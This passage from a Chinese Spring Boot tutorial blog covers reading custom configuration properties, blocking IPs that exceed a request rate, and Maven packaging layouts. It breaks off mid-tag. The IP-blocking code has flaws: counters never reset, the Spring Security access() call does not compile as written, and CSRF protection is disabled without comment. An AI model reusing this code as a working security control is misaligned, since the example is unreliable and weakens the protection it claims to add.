<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">my:</span></span><br><span class="line">  <span class="attr">user:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">自定义用户名</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">30</span></span><br><span class="line">    <span class="attr">email:</span> <span class="string">example@example.com</span></span><br></pre></td></tr></table></figure>
<p>在上述代码中，我们通过层级结构定义了 my.user 下的多个属性。那么，如何在代码中读取这些属性呢？有两种常见方式。</p>
<p><strong>使用@Value注解</strong><br>如果只是简单地读取单个属性值，我们可以在需要使用属性值的变量上添加 @Value(“${属性名}”) 注解。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyComponent</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;my.user.name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String myUserName;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;my.user.age&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> myUserAge;</span><br><span class="line">    <span class="comment">// 相应的 get 和 set 方法</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMyUserName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> myUserName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMyUserName</span><span class="params">(String myUserName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myUserName = myUserName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMyUserAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> myUserAge;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMyUserAge</span><span class="params">(<span class="type">int</span> myUserAge)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myUserAge = myUserAge;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，在 MyComponent 类中，我们就成功将配置文件中的属性值注入到了对应的变量中。不过，@Value 注解在处理多个相关属性时，代码可能会显得比较繁琐，此时我们可以采用另一种方式。</p>
<p><strong>使用@ConfigurationProperties注解</strong><br>这种方式更适合将一组相关的配置属性赋值给一个实体类。我们继续以上述 my.user 的配置为例，创建一个对应的实体类 UserConfig：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;my.user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserConfig</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="comment">// 生成对应的 get 和 set 方法</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmail</span><span class="params">(String email)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个类中，我们通过 @ConfigurationProperties(prefix &#x3D; “my.user”) 注解，告诉 Spring Boot 将配置文件中 my.user 前缀下的属性值绑定到这个类的对应属性上。同时，加上 @Component 注解，使 Spring Boot 启动时将该类作为 Bean 注入 IoC 容器。<br>之后，在需要使用这些属性的地方，比如 Controller 类中，我们还需要加上 @EnableConfigurationProperties 注解并指明该 bean 类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.EnableConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties(UserConfig.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserConfig userConfig;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/userConfig&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Name: &quot;</span> + userConfig.getName() + <span class="string">&quot;, Age: &quot;</span> + userConfig.getAge() + <span class="string">&quot;, Email: &quot;</span> + userConfig.getEmail();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，当访问 &#x2F;userConfig 接口时，就能获取到配置文件中自定义的用户属性信息了。这种方式对于管理一组相关的配置属性非常方便，代码结构也更加清晰。</p>
<h4 id="【功能三】自动封禁恶意访问-IP"><a href="#【功能三】自动封禁恶意访问-IP" class="headerlink" title="【功能三】自动封禁恶意访问 IP"></a>【功能三】自动封禁恶意访问 IP</h4><p><strong>解决方案</strong><br><strong>自定义过滤器实现</strong><br>首先，我们可以创建一个自定义过滤器来检查请求的 IP 地址。实现一个IpFilter类，继承OncePerRequestFilter ，在doFilterInternal方法中，通过HttpServletRequest对象的getRemoteAddr()方法获取请求的 IP 地址（需要注意，如果应用部署在反向代理后，可能要从X-Forwarded-For头中获取真实 IP）。</p>
<p>我们可以维护一个ConcurrentHashMap来存储每个 IP 的访问次数和初次访问时间。在过滤器中，每次请求时判断该 IP 的访问次数是否超过设定阈值（比如一分钟内访问超过 50 次），如果超过且距离初次访问时间在一定范围内，就将该 IP 加入到封禁列表中。封禁列表同样可以用ConcurrentHashMap存储，key 为 IP 地址，value 为封禁截止时间。当有请求到来时，先检查该 IP 是否在封禁列表中，如果在且当前时间未超过封禁截止时间，则直接返回错误信息，阻止访问。</p>
<p>这种方法的优点是灵活性高，开发者可以根据业务需求自由定制封禁规则，适用于对 IP 封禁逻辑有特殊要求的场景。但缺点也很明显，由于需要自行维护数据结构和逻辑判断，代码复杂度较高，且在高并发场景下，频繁对ConcurrentHashMap进行读写操作可能会带来性能损耗。</p>
<p>同时，还需要创建一个监听器IpListener来初始化这个 IP 存储器，并在 Spring Boot 启动类添加扫描过滤器和监听器的配置。具体代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.ServletComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.ServletListenerRegistrationBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ServletComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ServletListenerRegistrationBean&lt;IpListener&gt; <span class="title function_">ipListenerRegistrationBean</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ServletListenerRegistrationBean</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">IpListener</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextListener;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IpListener</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent sce)</span> &#123;</span><br><span class="line">        sce.getServletContext().setAttribute(<span class="string">&quot;ipMap&quot;</span>, <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;());</span><br><span class="line">        sce.getServletContext().setAttribute(<span class="string">&quot;blockedIpMap&quot;</span>, <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent sce)</span> &#123;</span><br><span class="line">        <span class="comment">// 可添加清理逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.filter.OncePerRequestFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IpFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_REQUESTS_PER_MINUTE</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BLOCK_DURATION</span> <span class="operator">=</span> <span class="number">60</span> * <span class="number">1000</span>; <span class="comment">// 封禁1分钟</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> request.getRemoteAddr();</span><br><span class="line">        Map&lt;String, Integer&gt; ipMap = (Map&lt;String, Integer&gt;) request.getServletContext().getAttribute(<span class="string">&quot;ipMap&quot;</span>);</span><br><span class="line">        Map&lt;String, Date&gt; blockedIpMap = (Map&lt;String, Date&gt;) request.getServletContext().getAttribute(<span class="string">&quot;blockedIpMap&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (blockedIpMap.containsKey(ip) &amp;&amp; <span class="keyword">new</span> <span class="title class_">Date</span>().before(blockedIpMap.get(ip))) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_FORBIDDEN, <span class="string">&quot;Your IP is blocked due to excessive requests.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ipMap.put(ip, ipMap.getOrDefault(ip, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (ipMap.get(ip) &gt; MAX_REQUESTS_PER_MINUTE) &#123;</span><br><span class="line">            blockedIpMap.put(ip, <span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + BLOCK_DURATION));</span><br><span class="line">            response.sendError(HttpServletResponse.SC_FORBIDDEN, <span class="string">&quot;Your IP is blocked due to excessive requests.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>结合 Spring Security 实现</strong><br>在 Spring Security 的配置类中，我们可以重写configure(HttpSecurity http)方法，结合自定义的逻辑来实现 IP 封禁。首先，定义一个IpAddressService接口及其实现类，用于判断 IP 是否为恶意 IP。在configure方法中，使用http.authorizeRequests()方法来对请求进行授权判断。</p>
<p>Spring Security 是一个功能强大且高度可定制的身份验证和访问控制框架，结合它实现 IP 封禁，优势在于能够与系统的权限管理体系无缝集成，适用于已经使用 Spring Security 进行安全管理的项目。但缺点是配置相对复杂，对于不熟悉 Spring Security 的开发者来说，学习成本较高。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.builders.HttpSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.access.AccessDeniedHandler;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> <span class="keyword">extends</span> <span class="title class_">WebSecurityConfigurerAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> IpAddressService ipAddressService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SecurityConfig</span><span class="params">(IpAddressService ipAddressService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.ipAddressService = ipAddressService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">           .authorizeRequests()</span><br><span class="line">                .antMatchers(<span class="string">&quot;/**&quot;</span>).access(ipAddressService::isIpAllowed)</span><br><span class="line">                .and()</span><br><span class="line">           .exceptionHandling()</span><br><span class="line">                .accessDeniedHandler(accessDeniedHandler())</span><br><span class="line">                .and()</span><br><span class="line">           .csrf().disable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> AccessDeniedHandler <span class="title function_">accessDeniedHandler</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (request, response, accessDeniedException) -&gt; &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_FORBIDDEN, <span class="string">&quot;Your IP is not allowed to access this resource.&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IpAddressService</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isIpAllowed</span><span class="params">(String ipAddress)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IpAddressServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">IpAddressService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, Long&gt; requestCounts = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_REQUESTS_PER_MINUTE</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BLOCK_DURATION</span> <span class="operator">=</span> <span class="number">60</span> * <span class="number">1000</span>; <span class="comment">// 封禁1分钟</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, Long&gt; blockedIps = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isIpAllowed</span><span class="params">(String ipAddress)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (blockedIps.containsKey(ipAddress) &amp;&amp; System.currentTimeMillis() &lt; blockedIps.get(ipAddress)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> requestCounts.getOrDefault(ipAddress, <span class="number">0L</span>);</span><br><span class="line">        <span class="keyword">if</span> (count &gt;= MAX_REQUESTS_PER_MINUTE) &#123;</span><br><span class="line">            blockedIps.put(ipAddress, System.currentTimeMillis() + BLOCK_DURATION);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        requestCounts.put(ipAddress, count + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，通过 Spring Security 的强大功能，结合自定义的 IP 判断逻辑，就能实现对恶意 IP 的封禁。</p>
<p>此外，还有一些需要额外注意的点。在获取 IP 地址时，从X-Forwarded-For头获取真实 IP 存在安全风险，因为该头信息可以被伪造，建议结合其他方式（如通过负载均衡器配置可靠的 IP 透传策略）进行验证。同时，对于封禁的 IP 列表，要考虑数据持久化问题，避免应用重启后封禁规则丢失；在集群环境下，还需要解决各节点之间封禁列表的同步问题，可借助分布式缓存（如 Redis）来实现。</p>
<h3 id="SpringBoot配置相关"><a href="#SpringBoot配置相关" class="headerlink" title="SpringBoot配置相关"></a>SpringBoot配置相关</h3><h4 id="SpringBoot多种生产打包方式"><a href="#SpringBoot多种生产打包方式" class="headerlink" title="SpringBoot多种生产打包方式"></a>SpringBoot多种生产打包方式</h4><h5 id="方法一-插件spring-boot-maven-plugin"><a href="#方法一-插件spring-boot-maven-plugin" class="headerlink" title="方法一 插件spring-boot-maven-plugin"></a>方法一 插件spring-boot-maven-plugin</h5><ul>
<li>项目应用的配置文件排除 统一打包到config目录下<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--filerting设置为true,则打包过程中会对这些文件进行过滤处理--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--指定目标路径为config--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>$&#123;project.build.directory&#125;/config<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--使用通配符--&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.yml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">include</span>&gt;</span>mapper/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 这里可以根据你实际想要包含的配置文件类型来添加更多的include配置 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>把我们写代码打包可执行jar，并排除依赖jar包<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--项目的启动类,如果有多个main就必须指定，没有可以缺失</span></span><br><span class="line"><span class="comment">     &lt;mainClass&gt;XXXXX.TwinWebApplication&lt;/mainClass&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--解决windows命令行窗口中文乱码--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">jvmArguments</span>&gt;</span>-Dfile.encoding=UTF-8<span class="tag">&lt;/<span class="name">jvmArguments</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">layout</span>&gt;</span>ZIP<span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--配置需要打包进项目的jar--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--填写需要打包所需要的依赖 。没有匹配上任何jar包机排除依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>no-exists-jar<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>non-exists-jar<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- 表示当运行mavn package打包时，使用Springboot插件打包 --&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>配置依赖的jar包 统一打包lib目录<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--此插件用于将依赖包抽出--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-dependency-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">excludeTransitive</span>&gt;</span>false<span class="tag">&lt;/<span class="name">excludeTransitive</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">stripVersion</span>&gt;</span>false<span class="tag">&lt;/<span class="name">stripVersion</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">includeScope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">includeScope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="方法二-使用maven-jar-plugin插件实现"><a href="#方法二-使用maven-jar-plugin插件实现" class="headerlink" title="方法二 使用maven-jar-plugin插件实现"></a>方法二 使用maven-jar-plugin插件实现</h5><ul>
<li>使用插件maven-resources-plugin处理配置文件打包到config目录<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span 